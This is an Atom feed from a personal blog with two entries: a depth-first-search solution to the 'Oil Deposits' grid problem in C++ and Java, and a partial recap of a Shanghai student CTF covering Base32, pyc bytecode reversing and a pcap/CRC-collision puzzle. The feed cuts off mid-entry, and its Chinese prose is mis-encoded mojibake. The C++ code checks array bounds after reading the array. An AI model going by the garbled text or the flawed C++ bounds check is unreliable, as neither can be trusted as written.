<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yof3ng&#39;s Blog | çƒ­çˆ±åˆ†äº«</title>
  
  <subtitle>Yof3ng</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yof3ng.xyz/"/>
  <updated>2018-11-07T14:38:37.322Z</updated>
  <id>http://www.yof3ng.xyz/</id>
  
  <author>
    <name>Yof3ng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DFSæ·±æœ_Oil_Deposits</title>
    <link href="http://www.yof3ng.xyz/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/"/>
    <id>http://www.yof3ng.xyz/2018/11/07/DFSæ·±æœ-Oil-Deposits/</id>
    <published>2018-11-07T14:26:26.000Z</published>
    <updated>2018-11-07T14:38:37.322Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰"><a href="#ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰" class="headerlink" title="ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰"></a>ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰</h1><h2 id="Oil-Deposits"><a href="#Oil-Deposits" class="headerlink" title="Oil Deposits"></a>Oil Deposits</h2><pre class=" language-c++"><code class="language-c++">The GeoSurvComp geologic survey company is responsible for detecting underground oil deposits.GeoSurvComp works with one large rectangular region of land at a time, and creates a grid that dividesthe land into numerous square plots. It then analyzes each plot separately, using sensing equipment todetermine whether or not the plot contains oil.A plot containing oil is called a pocket. If two pockets are adjacent, then they are part of thesame oil deposit. Oil deposits can be quite large and may contain numerous pockets. Your job is todetermine how many different oil deposits are contained in a grid.InputThe input file contains one or more grids. Each grid begins with a line containing m and n, the numberof rows and columns in the grid, separated by a single space. If m = 0 it signals the end of the input;otherwise 1 â‰¤ m â‰¤ 100 and 1 â‰¤ n â‰¤ 100. Following this are m lines of n characters each (not countingthe end-of-line characters). Each character corresponds to one plot, and is either â€˜*â€™, representing theabsence of oil, or â€˜@â€™, representing an oil pocket.OutputFor each grid, output the number of distinct oil deposits. Two different pockets are part of the sameoil deposit if they are adjacent horizontally, vertically, or diagonally. An oil deposit will not containmore than 100 pockets.</code></pre><p>sample input:</p><pre class=" language-c++"><code class="language-c++">1 1*3 5*@*@***@***@*@*1 8@@****@*5 5 ****@*@@*@*@**@@@@*@@@**@0 0</code></pre><p>sample output:</p><pre class=" language-c++"><code class="language-c++">0122</code></pre><p>å¼•ç”¨ä¸€ä¸‹ç™¾åº¦ç™¾ç§‘ï¼š</p><blockquote><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯DFS(Depth First Search)ï¼š</p><p>æ·±åº¦ä¼˜å…ˆæœç´¢æ˜¯ä¸€ç§åœ¨å¼€å‘çˆ¬è™«æ—©æœŸä½¿ç”¨è¾ƒå¤šçš„æ–¹æ³•ã€‚å®ƒçš„ç›®çš„æ˜¯è¦è¾¾åˆ°è¢«æœç´¢ç»“æ„çš„å¶ç»“ç‚¹(å³é‚£äº›ä¸åŒ…å«ä»»ä½•<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>çš„<a href="https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">HTMLæ–‡ä»¶</a>) ã€‚åœ¨ä¸€ä¸ªHTMLæ–‡ä»¶ä¸­ï¼Œå½“ä¸€ä¸ª<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>è¢«é€‰æ‹©åï¼Œè¢«é“¾æ¥çš„HTMLæ–‡ä»¶å°†æ‰§è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå³åœ¨æœç´¢å…¶ä½™çš„è¶…é“¾ç»“æœä¹‹å‰å¿…é¡»å…ˆå®Œæ•´åœ°æœç´¢å•ç‹¬çš„ä¸€æ¡é“¾ã€‚æ·±åº¦ä¼˜å…ˆæœç´¢æ²¿ç€HTMLæ–‡ä»¶ä¸Šçš„<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>èµ°åˆ°ä¸èƒ½å†æ·±å…¥ä¸ºæ­¢ï¼Œç„¶åè¿”å›åˆ°æŸä¸€ä¸ªHTMLæ–‡ä»¶ï¼Œå†ç»§ç»­é€‰æ‹©è¯¥HTMLæ–‡ä»¶ä¸­çš„å…¶ä»–è¶…é“¾ã€‚å½“ä¸å†æœ‰å…¶ä»–<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>å¯é€‰æ‹©æ—¶ï¼Œè¯´æ˜æœç´¢å·²ç»ç»“æŸã€‚</p></blockquote><blockquote><p>ç»å¸¸é‡åˆ°çš„ä¸ä»…æœ‰DFSï¼Œè¿˜æœ‰BFS(Breadth First Search):</p><p>å®½åº¦ä¼˜å…ˆ<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2988274" target="_blank" rel="noopener">æœç´¢ç®—æ³•</a>ï¼ˆåˆç§°å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼‰æ˜¯æœ€ç®€ä¾¿çš„å›¾çš„æœç´¢ç®—æ³•ä¹‹ä¸€ï¼Œè¿™ä¸€ç®—æ³•ä¹Ÿæ˜¯å¾ˆå¤šé‡è¦çš„å›¾çš„ç®—æ³•çš„åŸå‹ã€‚Dijkstra<a href="https://baike.baidu.com/item/%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/6975204" target="_blank" rel="noopener">å•æºæœ€çŸ­è·¯å¾„</a>ç®—æ³•å’ŒPrim<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91" target="_blank" rel="noopener">æœ€å°ç”Ÿæˆæ ‘</a>ç®—æ³•éƒ½é‡‡ç”¨äº†å’Œå®½åº¦ä¼˜å…ˆæœç´¢ç±»ä¼¼çš„æ€æƒ³ã€‚å…¶åˆ«ååˆå«BFSï¼Œå±äºä¸€ç§ç›²ç›®æœå¯»æ³•ï¼Œç›®çš„æ˜¯ç³»ç»Ÿåœ°å±•å¼€å¹¶æ£€æŸ¥å›¾ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œä»¥æ‰¾å¯»ç»“æœã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå¹¶ä¸è€ƒè™‘ç»“æœçš„å¯èƒ½ä½ç½®ï¼Œå½»åº•åœ°æœç´¢æ•´å¼ å›¾ï¼Œç›´åˆ°æ‰¾åˆ°ç»“æœä¸ºæ­¢ã€‚</p><p>BFSåœ¨æ±‚è§£æœ€çŸ­è·¯å¾„æˆ–è€…æœ€çŸ­æ­¥æ•°ä¸Šæœ‰å¾ˆå¤šçš„åº”ç”¨ã€‚åº”ç”¨æœ€å¤šçš„æ˜¯åœ¨èµ°è¿·å®«ä¸Šã€‚</p></blockquote><p>æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬éœ€è¦å‘å…«ä¸ªæ–¹å‘è¿›è¡Œæœç´¢ï¼Œå¹¶ä¸”è¿›è¡Œåˆ¤æ–­</p><p>å¯ä»¥ç”¨c++å†™å‡ºï¼š</p><pre class=" language-c++"><code class="language-c++">#include<iostream>#include<algorithm>#include<stdio.h>using namespace std;char map[101][101];int dfs(int i,int j);//å®šä¹‰å…¨å±€çš„ï¼Œmå’Œnint m,n;//ä¸»å‡½æ•°int main(){    int i,j,flag;    //æ¥å—å¤šç»„æ•°æ®    while(scanf("%d %d",&m,&n)!=EOF){        flag = 0;        if(m==0 || n==0) return 0;        for(i=0;i<m;i++)        {            for(j=0;j<n;j++)            {                cin>>map[i][j];            }        }        for(i=0;i<m;i++){            for(j=0;j<n;j++){                if(map[i][j]=='@'){                    dfs(i,j);                    flag = flag + 1;                }            }        }        printf("%d\n",flag);    }    return 0;}//å®šä¹‰æ·±åº¦ä¼˜å…ˆæœç´¢int dfs(int i,int j){    //è·Ÿä¸ªæ‰«æä»ªä¼¼çš„ï¼Œé€’å½’æœç´¢    //å¦‚æœä¸ä¸º@æˆ–è€…è¶…å‡ºèŒƒå›´ï¼Œåˆ™åœæ­¢è¯¥æ–¹å‘æœç´¢    if(map[i][j]!='@'||i<0||j<0||i>m||j>n) return 0;    //å‘å…«ä¸ªæ–¹å‘è¿›è¡Œç»§ç»­æœç´¢    else{        //æ ¹æ®dfsçš„ç‰¹ç‚¹ï¼Œè®¿é—®è¿‡çš„é¡¶ç‚¹éœ€è¦æ ‡è®°(è¿™é‡Œç½®ä¸º*)ï¼Œé˜²æ­¢é‡å¤é€’å½’çˆ†ç‚¸        map[i][j]='*';            dfs(i-1,j-1);        dfs(i-1,j);        dfs(i-1,j+1);        dfs(i,j-1);        dfs(i,j+1);        dfs(i+1,j-1);        dfs(i+1,j);        dfs(i+1,j+1);    }    return 0;}</code></pre><p>javaé‡æ„ç‰ˆ:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DFS_Oil_Deposits</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//æ³¨æ„è¿™é‡Œå› ä¸ºæ˜¯åŠ¨æ€ç”³è¯·æ•°ç»„ï¼Œä¸C++ä¸åŒï¼Œå¦‚æœä¸å…ˆåˆ¤æ–­å¥½å‚æ•°å¤§å°ï¼Œä¼šå¯¼è‡´æ•°ç»„è¶Šç•Œçš„é—®é¢˜</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>i <span class="token operator">>=</span> m <span class="token operator">||</span> j <span class="token operator">>=</span> n <span class="token operator">||</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//å‘å…«ä¸ªæ–¹å‘è¿›è¡Œç»§ç»­æœç´¢</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//æ ¹æ®dfsçš„ç‰¹ç‚¹ï¼Œè®¿é—®è¿‡çš„é¡¶ç‚¹éœ€è¦æ ‡è®°(è¿™é‡Œç½®ä¸º*)ï¼Œé˜²æ­¢é‡å¤é€’å½’çˆ†ç‚¸</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//å½“å…ƒç´ è¿‡å¤šæ— æ³•åˆ—ä¸¾æ—¶ï¼ŒåŠ¨æ€ç”³è¯·æ•°ç»„ä»¥ä¸‹é¢è¿™ç§æ–¹å¼</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ç”¨Scannerå®šä¹‰è¾“å…¥</span>        Scanner cin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ç›¸å½“äºc++ä¸­çš„EOFåˆ¤æ–­</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cin<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span>                    map<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                for (i = 0; i &lt; m; i++) {</span><span class="token comment" spellcheck="true">//                    for (j = 0; j &lt; n; j++) {</span><span class="token comment" spellcheck="true">//                        //map[i][j] = mapstrings[i][j];</span><span class="token comment" spellcheck="true">//                        System.out.print(map[i][j]);</span><span class="token comment" spellcheck="true">//                    }</span><span class="token comment" spellcheck="true">//                    System.out.print('\n');</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        }</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                            flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>å…¶å®æ˜¯é¡ºä¾¿ç»ƒä¹ ä¸€ä¸‹javaï¼Œc++å’Œjavaæœ‰æ¯”è¾ƒå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ä¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥éœ€è¦å¥½å¥½æ³¨æ„ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰&quot;&gt;&lt;a href=&quot;#ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰&quot;&gt;&lt;/a&gt;ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰&lt;/h1&gt;&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="DFS" scheme="http://www.yof3ng.xyz/tags/DFS/"/>
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="coding" scheme="http://www.yof3ng.xyz/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“</title>
    <link href="http://www.yof3ng.xyz/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/"/>
    <id>http://www.yof3ng.xyz/2018/11/06/ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“/</id>
    <published>2018-11-06T02:32:35.000Z</published>
    <updated>2018-11-06T08:34:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“"><a href="#ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“" class="headerlink" title="ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“"></a>ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“</h1><blockquote><p>æ‰“å®Œè¿™ä¸ªç¬¬å››å±Šä¸Šæµ·å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›åï¼Œç®€å•åšä¸ªå°ç»“ï¼Œå·©å›ºä¸€ä¸‹ğŸ˜­ã€‚</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°BASE32"><a href="#ç­¾åˆ°BASE32" class="headerlink" title="ç­¾åˆ°BASE32"></a>ç­¾åˆ°BASE32</h3><blockquote><p>ç¬¬ä¸€é“é¢˜æ˜¯BASE32ï¼Œç­¾åˆ°é¢˜ï¼Œé£˜è¿‡ã€‚</p></blockquote><h3 id="pycåç¼–è¯‘"><a href="#pycåç¼–è¯‘" class="headerlink" title="pycåç¼–è¯‘"></a>pycåç¼–è¯‘</h3><blockquote><p>ç¬¬äºŒé¢˜æ˜¯pythonçš„åç¼–è¯‘ï¼Œä¸€ä¸ªpycæ–‡ä»¶ã€‚</p><p>å¯èƒ½æˆ‘æ˜¯ç¢°å·§åšå‡ºæ¥çš„ï¼Œé€šè¿‡importå¯¼åŒ…ï¼ˆimportæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œpycéƒ½èƒ½å¯¼ï¼‰ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªåˆ—è¡¨<code>[0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]</code>ï¼ŒæŒ‰åˆ—è¡¨é¡ºåºä¾æ¬¡å¯¹â€fâ€,â€lâ€,â€aâ€,â€gâ€,å¼‚æˆ–å¯ä»¥å¾—åˆ°keyå€¼ä¸º102ï¼Œç„¶åå¯¹åˆ—è¡¨è¿›è¡Œå¼‚æˆ–æ“ä½œå¯ä»¥å¾—åˆ°flagã€‚</p><p>ä½†æ˜¯å¤§ä½¬ä»¬æ˜¯æ€ä¹ˆå»åšè¿™é¢˜çš„å‘¢ï¼šå‘ç°pycæ–‡ä»¶ä¸­æœ‰æ¶æ„æ’å…¥çš„ä¸€è¡Œå­—èŠ‚ç ï¼Œæ­£æ˜¯å› ä¸ºè¿™ä¸ªï¼Œå¯¼è‡´pycæ— æ³•è¢«åç¼–è¯‘ï¼Œåˆ é™¤ä¹‹ååç¼–è¯‘å¯ä»¥å¾—åˆ°ï¼š</p><pre class=" language-assembly"><code class="language-assembly">1       0  JUMP_ABSOLUTE         6  'to 6'           3             6  JUMP_ABSOLUTE         9  'to 9'           9  LOAD_CONST            0  ''          12  LOAD_CONST            1  10          15  LOAD_CONST            2  7          18  LOAD_CONST            3  1          21  LOAD_CONST            4  29          24  LOAD_CONST            5  14          27  LOAD_CONST            2  7          30  LOAD_CONST            6  22          33  LOAD_CONST            6  22          36  LOAD_CONST            7  31          39  LOAD_CONST            8  57          42  LOAD_CONST            9  30          45  LOAD_CONST           10  9          48  LOAD_CONST           11  52   2      51  LOAD_CONST           12  27          54  BUILD_LIST_15        15          57  STORE_NAME            0  'cmp'   3      60  LOAD_NAME             1  'raw_input'          63  CALL_FUNCTION_0       0   4      66  STORE_NAME            2  'flag'          69  LOAD_CONST            0  ''          72  STORE_NAME            3  'm'          75  SETUP_LOOP           91  'to 169'          78  LOAD_NAME             2  'flag'          81  GET_ITER          82  FOR_ITER             83  'to 168'          85  STORE_NAME            4  'i'          88  LOAD_NAME             5  'ord'          91  LOAD_NAME             4  'i'          94  CALL_FUNCTION_1       1          97  UNARY_INVERT          98  LOAD_CONST           13  102         101  BINARY_AND         102  LOAD_NAME             5  'ord'         105  LOAD_NAME             4  'i'         108  CALL_FUNCTION_1       1         111  LOAD_CONST           18  -103         114  BINARY_AND         115  BINARY_OR         116  STORE_NAME            4  'i'         119  LOAD_NAME             4  'i'         122  LOAD_NAME             0  'cmp'         125  LOAD_NAME             3  'm'         128  BINARY_SUBSCR         129  COMPARE_OP            2  '=='         132  POP_JUMP_IF_FALSE   144  'to 144'         135  LOAD_NAME             3  'm'   8     138  UNARY_NEGATIVE         139  LOAD_CONST           14  -1         142  BINARY_ADD         143  UNARY_NEGATIVE  10     144  STORE_NAME            3  'm'         147  JUMP_BACK            73  'to 73'         150  CONTINUE             73  'to 73'         153  LOAD_CONST           15  'wrong'         156  PRINT_ITEM         157  PRINT_NEWLINE_CONT         158  LOAD_NAME             6  'exit'         161  CALL_FUNCTION_0       0         164  POP_TOP         165  JUMP_BACK            73  'to 73'         168  POP_BLOCK       169_0  COME_FROM                '75'         169  LOAD_CONST           16  'right'         172  PRINT_ITEM         173  PRINT_NEWLINE_CONT</code></pre><p>åˆ†ææ¸…æ¥šé€»è¾‘ä¹‹åå¯ä»¥é€†å‡ºflagã€‚</p></blockquote><h3 id="N0find"><a href="#N0find" class="headerlink" title="N0find"></a>N0find</h3><blockquote><p>å¤§æ‚çƒ©ï¼Œé¦–å…ˆé€šè¿‡wiresharkæå–å‡ºä¸¤å¼ å›¾ç‰‡ï¼ˆå®é™…ä¸Šæ•°æ®åŒ…ä¸­è¿˜è—ç€ä¸€äº›ä¸ä¸ºäººçŸ¥çš„ä¸œè¥¿ï¼‰ï¼Œå…¶ä¸­ä¸€å¼ æ˜¯å…³é”®ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/ctfisfun.jpeg" alt=""></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ª<code>ct??????</code>ï¼Œè«éæ˜¯ctfä»€ä¹ˆçš„ï¼Œå…­ä¸ªé—®å·ï¼Œå…«ä½ã€‚ï¼ˆåé¢å®˜æ–¹ç»™å‡ºæç¤ºï¼Œopenbuffï¼ˆæŸä¸€ä¸çŸ¥é“å“ªä¸ªè§’è½çš„éšå†™è½¯ä»¶ï¼‰ï¼Œcrcç¢°æ’ï¼Œä»¥åŠç¢°æ’å‡ºæ¥çš„å€¼ä¸­å«æœ‰fï¼‰ã€‚</p><p>è¿™ä¸ªæ—¶å€™å°±æ‡µé€¼äº†ï¼Œæ‹¿ä»€ä¹ˆå»crcç¢°æ’ï¼Œç¢°æ’å®Œåˆèƒ½å¹²å•¥ï¼Ÿ</p><p>ä»”ç»†çœ‹çœ‹æ•°æ®åŒ…ä¸­ï¼Œå‡ºç°äº†crcå­—çœ¼ï¼Œå¹¶ä¸”å«æœ‰3ä¸ªç–‘ä¼¼crcçš„å€¼ï¼š</p><p><code>C61B1F65</code>,<code>E74E142D</code>,<code>648BDAD5</code></p><p>æ‹¿crcç¢°æ’è„šæœ¬è¿›è¡Œç¢°æ’å¾—åˆ°ä¸‰ç»„ä¸­æ¯ç»„å«æœ‰fçš„å€¼ï¼š</p><p>1.<code>93fjhl    fBWjIv</code></p><p>2.<code>mbof3k      